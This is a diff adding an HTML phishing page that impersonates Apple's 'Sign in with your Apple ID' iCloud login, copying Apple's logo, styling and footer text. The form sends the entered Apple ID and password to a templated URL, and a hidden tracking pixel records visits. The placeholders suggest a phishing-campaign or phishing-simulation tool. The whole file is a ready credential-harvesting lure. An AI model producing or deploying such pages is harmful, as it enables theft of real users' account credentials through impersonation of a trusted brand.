@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Sign in with your Apple ID</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #f5f5f7; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
+        .header { width: 100%; padding: 12px 0; text-align: center; background: rgba(255,255,255,0.72); backdrop-filter: saturate(180%) blur(20px); border-bottom: 1px solid rgba(0,0,0,0.1); }
+        .header svg { width: 18px; height: 22px; fill: #333; }
+        .main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 20px; width: 100%; }
+        .login-card { width: 400px; text-align: center; }
+        h1 { font-size: 28px; font-weight: 600; color: #1d1d1f; margin-bottom: 8px; letter-spacing: -0.3px; }
+        .subtitle { font-size: 17px; color: #6e6e73; margin-bottom: 32px; font-weight: 400; }
+        .form-group { margin-bottom: 0; position: relative; }
+        .form-group input { width: 100%; padding: 16px 16px 16px 16px; border: 1px solid #d2d2d7; font-size: 17px; outline: none; background: #fff; color: #1d1d1f; }
+        .form-group:first-of-type input { border-radius: 12px 12px 0 0; border-bottom: none; }
+        .form-group:nth-of-type(2) input { border-radius: 0 0 12px 12px; }
+        .form-group input:focus { border-color: #0071e3; z-index: 1; position: relative; box-shadow: 0 0 0 4px rgba(0,113,227,0.3); }
+        .form-group input::placeholder { color: #86868b; }
+        .submit-btn { width: 100%; background: #0071e3; color: #fff; border: none; padding: 12px; border-radius: 12px; font-size: 17px; font-weight: 400; cursor: pointer; margin-top: 16px; transition: background 0.2s; }
+        .submit-btn:hover { background: #0077ed; }
+        .links { margin-top: 20px; }
+        .links a { font-size: 14px; color: #0066cc; text-decoration: none; display: block; margin-bottom: 8px; }
+        .links a:hover { text-decoration: underline; }
+        .divider { margin: 24px 0; border-top: 1px solid #d2d2d7; }
+        .create-link { font-size: 14px; color: #0066cc; text-decoration: none; font-weight: 600; }
+        .create-link:hover { text-decoration: underline; }
+        .footer { width: 100%; max-width: 980px; padding: 16px 20px; border-top: 1px solid #d2d2d7; margin-top: auto; }
+        .footer p { font-size: 12px; color: #6e6e73; line-height: 1.5; margin-bottom: 8px; }
+        .footer-links { display: flex; flex-wrap: wrap; gap: 16px; }
+        .footer-links a { font-size: 12px; color: #424245; text-decoration: none; }
+        .footer-links a:hover { text-decoration: underline; }
+        @media (max-width: 480px) { .login-card { width: 100%; padding: 0 20px; } h1 { font-size: 24px; } }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <svg viewBox="0 0 18 22" xmlns="http://www.w3.org/2000/svg"><path d="M15.07 11.65c-.02-2.28 1.87-3.38 1.95-3.43-1.06-1.55-2.71-1.76-3.3-1.79-1.4-.14-2.74.83-3.46.83-.72 0-1.82-.81-2.99-.79-1.54.02-2.96.9-3.75 2.28-1.6 2.78-.41 6.9 1.15 9.15.76 1.1 1.67 2.34 2.87 2.3 1.15-.05 1.58-.75 2.97-.75 1.39 0 1.78.75 2.99.72 1.24-.02 2.02-1.12 2.77-2.23.87-1.27 1.23-2.51 1.25-2.57-.03-.01-2.4-.92-2.42-3.65l-.03-.07zM12.78 4.41c.63-.77 1.06-1.83.94-2.89-.91.04-2.01.61-2.66 1.37-.59.68-1.1 1.77-.96 2.81 1.01.08 2.04-.52 2.68-1.29z"/></svg>
+    </div>
+    <div class="main">
+        <div class="login-card">
+            <h1>Sign in with your Apple ID</h1>
+            <p class="subtitle">Use your Apple ID to sign in to iCloud</p>
+            <form action="{{.URL}}" method="POST">
+                <div class="form-group">
+                    <input type="email" name="email" placeholder="Apple ID" required autofocus>
+                </div>
+                <div class="form-group">
+                    <input type="password" name="password" placeholder="Password">
+                </div>
+                <button type="submit" class="submit-btn">Sign In</button>
+            </form>
+            <div class="links">
+                <a href="#">Forgot Apple ID or password?</a>
+                <a href="#">Don't have an Apple ID? Create yours now.</a>
+            </div>
+        </div>
+    </div>
+    <div class="footer">
+        <p>Your Apple ID is the email address you use for Apple services like the App Store, Apple Music, iCloud, iMessage, FaceTime, and more.</p>
+        <div class="footer-links">
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms of Use</a>
+        </div>
+    </div>
+    <img src="{{.Tracker}}" style="display:none" alt="">
+</body>
+</html>
